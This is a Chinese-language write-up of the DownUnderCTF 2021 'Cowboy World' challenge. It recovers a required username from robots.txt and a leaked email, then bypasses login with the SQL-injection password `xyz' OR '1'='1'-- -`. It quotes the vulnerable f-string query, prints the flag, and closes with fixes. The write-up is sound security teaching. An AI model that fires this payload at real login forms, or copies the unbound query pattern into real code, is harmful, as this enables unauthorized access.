# DownUnderCTF 2021 - Cowboy World

## 题目简述

登录接口强制用户名必须是 `sadcowboy`，但把密码直接拼接进 SQLite 查询。`robots.txt` 泄露了包含合法用户名提示的邮件；取得用户名后，在密码字段注入恒真条件即可绕过认证。

## 解题过程

先访问：

```text
/robots.txt
```

其中包含：

```text
Disallow: /sad.eml
```

继续读取 `/sad.eml`，正文说明只有 `sadcowboy` 可以进入网站。这个用户名不能用 SQL 注入绕过，因为应用先做了显式判断：

```python
if uname != "sadcowboy":
    return "Incorrect username or password"
```

真正的问题在随后构造的查询：

```python
statement = (
    "SELECT * from users "
    f"WHERE username=(?) AND password='{pword}';"
)
c.execute(statement, (uname,))
```

用户名使用参数绑定，密码却被直接插入 SQL。提交：

```text
username=sadcowboy
password=xyz' OR '1'='1'-- -
```

查询近似变为：

```sql
SELECT * FROM users
WHERE username=('sadcowboy') AND password='xyz'
   OR '1'='1'-- -';
```

`-- -` 注释掉末尾引号，恒真条件使查询至少返回一行。应用只检查 `fetchone()` 是否为空，不检查返回行是否真的属于目标账号，于是进入成功页面并显示：

```text
DUCTF{haww_yeeee_downunderctf?}
```

## 方法总结

本题先通过 `robots.txt` 和遗留邮件恢复服务强制要求的用户名，再利用密码字段的 SQL 注入。只对部分参数做预编译并不能保护整条语句；所有用户输入都应使用占位符绑定，认证逻辑还应核验取得的具体用户，而不是仅判断查询是否返回任意记录。
